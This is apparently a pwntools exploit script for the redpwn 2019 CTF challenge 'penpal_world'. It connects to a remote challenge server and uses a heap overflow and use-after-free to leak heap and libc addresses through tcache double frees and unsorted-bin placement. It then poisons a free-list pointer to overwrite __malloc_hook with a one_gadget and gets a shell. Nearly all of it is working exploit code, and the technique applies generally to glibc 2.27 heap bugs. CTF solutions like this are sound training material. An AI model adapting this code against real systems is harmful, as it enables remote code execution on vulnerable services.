#!/usr/bin/env python2

from pwn import *

HOST, PORT = 'chall2.2019.redpwn.net', 4010
BINARY = './penpal_world'

elf = ELF(BINARY)
context.arch = 'amd64'

if not args.REMOTE:
	libc = elf.libc
else:
	libc = ELF('./libc-2.27.so')

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process(BINARY)
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = ""
    PIE = get_base_address(p)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

# We can only allocate two cards at any time, and they are both of size 0x48 bytes
def add(index):
	p.sendlineafter('Read a postcard\n', '1')
	p.sendlineafter('#?\n', str(index))

# The edit function does no bounds checking thus we have a heap overflow
def edit(index, content):
	p.sendlineafter('Read a postcard\n', '2')
	p.sendlineafter('#?\n', str(index))
	p.sendlineafter('Write.\n', str(content))

# The discard function does not zero out the pointer after freeing, thus we have a UAF
def free(index):
	p.sendlineafter('Read a postcard\n', '3')
	p.sendlineafter('#?\n', str(index))

# The display function, uses puts to display the contents of the chunk
def read(index):
	p.sendlineafter('Read a postcard\n', '4')
	p.sendlineafter('#?\n', str(index))

	return p.recvline()

context.terminal = ['tmux', 'new-window']
p = start()
if not args.REMOTE and args.GDB:
	debug([0x9b3, 0xa7c, 0xb11, 0xba6]) # [add, edit, free, read]

'''
Here's the plan, I will refer to chunks in sequential order A, B, C, etc:

1. 	Leak a heap address to calculate the heap base. We can use this information to create our own chunk anywhere we want.
	The heap leak is easy to do since this binary uses libc version 2.27. 2.26 introduced the tcache bins, which do not perform
	as many security checks as the normal bins do. This means we can just double free a chunk A to leak a heap address.

2.	With the initial chunk A that we allocate, we need to edit it in order to create a fake chunk B that follows immediately after it.
	We can then edit chunk A again to change its FD pointer to point to our fake chunk B. This will let us malloc a new chunk B at that 
	address (that we control).

3.	Now we need a libc leak. Remember that we are only allowed to perform malloc calls of 0x48 bytes, which means that every single malloc 
	call we make will be of fast bin size (fastchunks are <= 0x80 bytes), meaning they'll go into the tcache fastbin, which is singly linked.
	In order to leak a libc address though, we need to make sure we can free chunk B and put it in either the unsorted bin or the small bin. In the
	case of this challenge, we can put one of the fastchunks into the unsorted bin simply by filling up the tcache bin to its max size (7).
	After the tcache bin is full, the following free will put an address from the main_arena in libc into the FD pointer of chunk B. We can
	then just read this chunk's FD pointer to get a libc leak, and calculate the libc base address from that.

4.	Using our libc leak, we can calculate the address of __malloc_hook, as well as a one_gadget. We then overwrite chunk A's FD pointer to point to
	__malloc_hook. Remember that chunk A is already free, so what we can then do is allocate two more chunks, where the second malloc will return a chunk
	that is right on top of __malloc_hook. We can then edit this chunk and replace the address with our one_gadget.

5.	Finally, we just attempt to create a card, which then calls __malloc_hook, which calls our one_gadget, thus giving us our shell.
'''

add(0)
add(1)
free(0)
free(1)

heap_base = u64(read(1)[:-1].ljust(8, '\x00')) - 0x260 # The 0x260 offset is found using gdb
log.info("Leaked heap base: " + hex(heap_base))

edit(1, p64(heap_base + 0x10))

add(1)
add(0)
free(1)

log.progress('Filling tcache bin now...')
for i in range(7):
	free(0)

free(0)
main_arena_leak = u64(read(0)[:-1].ljust(8, '\x00'))
main_arena_offset = 0x3ebca0 # Found using gdb

libc.address = main_arena_leak - main_arena_offset
malloc_hook = libc.symbols['__malloc_hook']
one_gadget_offset = 0x10a38c # 0x4f322, 0x4f2c5

log.success('Leaked main_arena address: ' + hex(main_arena_leak))
log.info('Calculated libc base: ' + hex(libc.address))
log.info('Calculated __malloc_hook address: ' + hex(libc.symbols['__malloc_hook']))

edit(1, p64(malloc_hook))
add(1)
add(1)
edit(1, p64(libc.address + one_gadget_offset))

add(1)

p.interactive()